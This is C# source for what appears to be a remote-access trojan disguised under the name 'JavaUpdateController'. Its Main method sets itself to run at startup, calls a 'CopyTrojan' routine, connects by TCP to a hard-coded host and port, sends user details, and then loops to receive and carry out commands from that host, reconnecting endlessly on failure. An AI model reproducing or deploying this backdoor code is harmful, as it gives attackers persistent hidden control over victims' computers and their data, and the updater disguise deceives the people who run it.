using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.IO;
using JavaUpdateController;

namespace JavaUpdateController
{
    class Program
    {
        public static void Main(string[] args)
        {
            Functions.AddStartUp();
            //Functions.DeleteStartUp();
            CMDCustom.CopyTrojan();

            retry:
            try
            {
                TcpClient tcp = new TcpClient();
                tcp.Connect(System.Net.IPAddress.Parse("192.168.21.89"), 30021);
                NetworkStream stream = tcp.GetStream();

                Functions.SendUser(stream);

                while (true)
                { 
                    String comm = Messages.ReceiveMessage(stream);
                    stream.Flush();

                    if ((int)Char.GetNumericValue(comm.ToCharArray()[0]) == 7)
                    {
                        break;
                    }

                    Functions.WorkCommand(comm, stream);
                }
                
                tcp.Close();
                goto retry;
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.StackTrace);
                goto retry;
            }
        }
    }
}